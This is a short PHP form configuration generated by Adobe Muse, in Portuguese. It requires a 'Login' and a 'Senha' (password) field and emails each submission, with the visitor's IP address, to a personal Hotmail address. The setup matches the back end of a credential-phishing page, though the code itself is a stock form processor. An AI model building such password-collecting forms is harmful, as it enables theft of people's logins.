<?php 
/* 	
If you see this text in your browser, PHP is not configured correctly on this hosting provider. 
Contact your hosting provider regarding PHP configuration for your site.

PHP file generated by Adobe Muse CC 2015.0.2.310
*/

require_once('form_process.php');

$form = array(
	'subject' => 'Home Form envio',
	'heading' => 'Envio de novo formulário',
	'success_redirect' => '',
	'resources' => array(
		'checkbox_checked' => 'Marcado',
		'checkbox_unchecked' => 'Desmarcado',
		'submitted_from' => 'Formulário enviado do site: %s',
		'submitted_by' => 'Endereço IP do visitante: %s',
		'too_many_submissions' => 'Muitos envios recentes deste IP',
		'failed_to_send_email' => 'Falha no envio do email',
		'invalid_reCAPTCHA_private_key' => 'Chave privada do reCAPTCHA inválida.',
		'invalid_field_type' => 'Tipo de campo desconhecido \"%s\".',
		'invalid_form_config' => 'O campo \"%s\" possui uma configuração inválida.',
		'unknown_method' => 'Método de solicitação de servidor desconhecido'
	),
	'email' => array(
		'from' => 'hugo_samp@hotmail.com',
		'to' => 'hugo_samp@hotmail.com'
	),
	'fields' => array(
		'custom_U1040' => array(
			'order' => 1,
			'type' => 'string',
			'label' => 'Login',
			'required' => true,
			'errors' => array(
				'required' => 'O campo \"Login\" é obrigatório.'
			)
		),
		'Email' => array(
			'order' => 2,
			'type' => 'email',
			'label' => 'Senha',
			'required' => true,
			'errors' => array(
				'required' => 'O campo \"Senha\" é obrigatório.',
				'format' => 'O campo \"Senha\" possui um email inválido.'
			)
		)
	)
);

process_form($form);
?>
